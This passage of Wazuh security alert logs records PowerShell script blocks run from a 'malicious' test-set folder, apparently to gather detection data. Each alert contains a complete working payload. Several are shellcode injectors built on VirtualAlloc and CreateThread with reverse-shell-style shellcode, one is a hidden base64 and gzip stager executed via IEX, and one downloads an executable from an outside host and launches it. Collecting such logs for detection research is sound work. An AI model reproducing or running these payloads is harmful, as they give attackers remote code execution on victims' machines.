$z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 97af9d91-7112-4913-9483-f9bdb73578e3\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2377.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xac,0x18,0xc9,0x45,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"97af9d91-7112-4913-9483-f9bdb73578e3","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2377.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:56.816+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":15,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304396.2948373","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:16.6052891Z","eventRecordID":"145268","processID":"3748","threadID":"3820","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJrcOFgCA71WbW/aSBD+3Er9D1aFZFslGBLSpJEq3drG4AAJxMEEOFRt7LW9ZPESe81br//9xrwk5Jr2ev1wViJ2PTO7zz7zzI6DLPYE5bE0WTdsk345e/wofX339k0HJ3gqKYXYOV0M42UWFaXC5Ky8ovzx3pnXmuqbN+BVeLw0+bDPToeXflP6LCkjNJuZfIppPL64MLIkIbHYzkt1IlCakuk9oyRVVOkvqR+RhBxd30+IJ6SvUuFLqc74PWY7t5WBvYhIRyj2c1uLezhHWnJmjApF/vNPWR0dVcal2mOGWarIzioVZFryGZNV6Zuab3i7mhFFblMv4SkPRKlP45PjUi9OcUCuYLU5aRMRcT+VVTgN/CVEZEksvThXvtDWTZFh2Em4h3w/ISlElex4zh8I8JQxVpT+UEY7FDdZLOiUgF2QhM8cksypR9JSA8c+IzckGCtXZLE//K8GKYdB4NURiVqELP0Ebpv7GSPbFWT1e8DPGVbh+WeWgZZv796+exvsZTIv191DgcDozWgzJoBZ6fCUbvw+S+Wi1IZdseDJCqaF2yQj6lga5TkZjcdSgUzOiz8Or+x9wRMvudVvkWhRsb6AaeRy6o8hdJe0gtfPmivjdJ3bfixAkwQ0JuYqxlPq7TWmvJYGEjCyOW5p73YFABV5ZyC+SRgJscgJLUqj78NqUyqeYvWMMp8kyINUpoAKsqy+BLPNkSLbcZtMga7tXIZkBKBssvfeqXm13z2fg5NsMJymRamTQWl5RckhmBG/KKE4pTsTygTfDOVnuO2MCerhVOyXG6uHXO72NHiciiTzIItw/ltnRjyKWU5HUWpQn+grh4b7veVXyTAwYzQOYaU5JAPe5CQ4ItdGAjBzHaglhwh7OmNkCi6bMrcYDqGodyWx0RIOiS+/BnIv9622c0r2XBxAhDw7jIui5NJEwI2R03sorN9CcnBlPGEyErJLjrIvn5G+ErnoC1nXjs77a/s2l+qOqg0xiQBSrIRPdZySj1VHJECZ8l67pgaCZ2DHrO3pD7SCFrRit+G/R09sbp75zctJQ0vMZRQgO7XbjY7ZbTSq80vHrQqnZotmxxbt2t1k4qDGTW8ghjZq3NLyw6C6nl3StdNC/mCpfVzr60VZX64noR8MzCAIzwLnpnJq0Vbf6OrlY9wya1mrry/0cjWt0UWjS3vdh0tL3A9chnuBFt5VPmG6bCUTt8LbaxuhenTirS8Dtx61/dWgoX3qVx9QDSEjrrmWzpsDPUEdzcWhyxfNUK/VQwPplkfJsNuz9G7X0lGvPnk0P2khxN7hSO+7x3Q4u7uJYG4BhKZWrto+WfNBF0iqc4TDG/AJjWMvCsDH/ID0D1c8PcYPOkc6+FjDR8A1mFkdBvbb3jFHLru6w6g1XFmaVhl0qqhRpv16iPIlcah3MUrn5trUKq7P/f7p1SDQ3Dt2ppnG7cwLNE1bNMymN6wsz6/Pzlt96k456mma+z4XCCik4HdabbuBgl5Ubx3k/Ue3fRsnaYQZ6AGu731xWjyxdndwh9M8QlEOWvYDSWLCoLdB99sLHDHGvbw9bO5saE3bhjGGIu3B8OT41ZEqPTmqz+1i/+riYghYoVSehFxqkTgUUbG8PCmX4c4vL6tlOPivH9Lgs5XyvF4xbxwvKHuxG9vspuZFVVgMqsZA8P+D0l1NR/Dj/xulz+9+Yv0lmsvFl0R8Z3754j/R/ptE9DEV4O/A7cTItm2+zsdOTQdfHLt0gVKC3ZN/BF5n4ugKvkX+BuPhEqyJCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\r\n\r\nScriptBlock ID: 8fcd30cc-bd4a-454f-a395-4b577d8387f8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2382.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAJrcOFgCA71WbW/aSBD+3Er9D1aFZFslGBLSpJEq3drG4AAJxMEEOFRt7LW9ZPESe81br//9xrwk5Jr2ev1wViJ2PTO7zz7zzI6DLPYE5bE0WTdsk345e/wofX339k0HJ3gqKYXYOV0M42UWFaXC5Ky8ovzx3pnXmuqbN+BVeLw0+bDPToeXflP6LCkjNJuZfIppPL64MLIkIbHYzkt1IlCakuk9oyRVVOkvqR+RhBxd30+IJ6SvUuFLqc74PWY7t5WBvYhIRyj2c1uLezhHWnJmjApF/vNPWR0dVcal2mOGWarIzioVZFryGZNV6Zuab3i7mhFFblMv4SkPRKlP45PjUi9OcUCuYLU5aRMRcT+VVTgN/CVEZEksvThXvtDWTZFh2Em4h3w/ISlElex4zh8I8JQxVpT+UEY7FDdZLOiUgF2QhM8cksypR9JSA8c+IzckGCtXZLE//K8GKYdB4NURiVqELP0Ebpv7GSPbFWT1e8DPGVbh+WeWgZZv796+exvsZTIv191DgcDozWgzJoBZ6fCUbvw+S+Wi1IZdseDJCqaF2yQj6lga5TkZjcdSgUzOiz8Or+x9wRMvudVvkWhRsb6AaeRy6o8hdJe0gtfPmivjdJ3bfixAkwQ0JuYqxlPq7TWmvJYGEjCyOW5p73YFABV5ZyC+SRgJscgJLUqj78NqUyqeYvWMMp8kyINUpoAKsqy+BLPNkSLbcZtMga7tXIZkBKBssvfeqXm13z2fg5NsMJymRamTQWl5RckhmBG/KKE4pTsTygTfDOVnuO2MCerhVOyXG6uHXO72NHiciiTzIItw/ltnRjyKWU5HUWpQn+grh4b7veVXyTAwYzQOYaU5JAPe5CQ4ItdGAjBzHaglhwh7OmNkCi6bMrcYDqGodyWx0RIOiS+/BnIv9622c0r2XBxAhDw7jIui5NJEwI2R03sorN9CcnBlPGEyErJLjrIvn5G+ErnoC1nXjs77a/s2l+qOqg0xiQBSrIRPdZySj1VHJECZ8l67pgaCZ2DHrO3pD7SCFrRit+G/R09sbp75zctJQ0vMZRQgO7XbjY7ZbTSq80vHrQqnZotmxxbt2t1k4qDGTW8ghjZq3NLyw6C6nl3StdNC/mCpfVzr60VZX64noR8MzCAIzwLnpnJq0Vbf6OrlY9wya1mrry/0cjWt0UWjS3vdh0tL3A9chnuBFt5VPmG6bCUTt8LbaxuhenTirS8Dtx61/dWgoX3qVx9QDSEjrrmWzpsDPUEdzcWhyxfNUK/VQwPplkfJsNuz9G7X0lGvPnk0P2khxN7hSO+7x3Q4u7uJYG4BhKZWrto+WfNBF0iqc4TDG/AJjWMvCsDH/ID0D1c8PcYPOkc6+FjDR8A1mFkdBvbb3jFHLru6w6g1XFmaVhl0qqhRpv16iPIlcah3MUrn5trUKq7P/f7p1SDQ3Dt2ppnG7cwLNE1bNMymN6wsz6/Pzlt96k456mma+z4XCCik4HdabbuBgl5Ubx3k/Ue3fRsnaYQZ6AGu731xWjyxdndwh9M8QlEOWvYDSWLCoLdB99sLHDHGvbw9bO5saE3bhjGGIu3B8OT41ZEqPTmqz+1i/+riYghYoVSehFxqkTgUUbG8PCmX4c4vL6tlOPivH9Lgs5XyvF4xbxwvKHuxG9vspuZFVVgMqsZA8P+D0l1NR/Dj/xulz+9+Yv0lmsvFl0R8Z3754j/R/ptE9DEV4O/A7cTItm2+zsdOTQdfHLt0gVKC3ZN/BF5n4ugKvkX+BuPhEqyJCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);","scriptBlockId":"8fcd30cc-bd4a-454f-a395-4b577d8387f8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2382.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:56.912+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":11,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304396.2959727","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:17.4857131Z","eventRecordID":"145272","processID":"5124","threadID":"2148","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yhggkj.exe',\"$env:TEMP\\payment.exe\");Start-Process (\"$env:TEMP\\payment.exe\")\r\n\r\nScriptBlock ID: efe3efc3-2c6d-4d3c-bf71-ade4a3c77b80\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2408.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yhggkj.exe',\\\"$env:TEMP\\\\payment.exe\\\");Start-Process (\\\"$env:TEMP\\\\payment.exe\\\")","scriptBlockId":"efe3efc3-2c6d-4d3c-bf71-ade4a3c77b80","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2408.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:58.226+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":115,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304398.2962296","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:18.1833778Z","eventRecordID":"145276","processID":"2120","threadID":"9212","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x69,0x68,0x02,0x00,0x02,0x9a,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1fb806ff-a720-4789-9a31-fc8350c69f91\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2413.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x69,0x68,0x02,0x00,0x02,0x9a,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1fb806ff-a720-4789-9a31-fc8350c69f91","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\2413.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:19:59.259+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":116,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304399.2973121","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:20:19.0738550Z","eventRecordID":"145280","processID":"6736","threadID":"2852","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 7e650f84-53f0-46d6-8909-e9e8cfee9da8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\2416.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 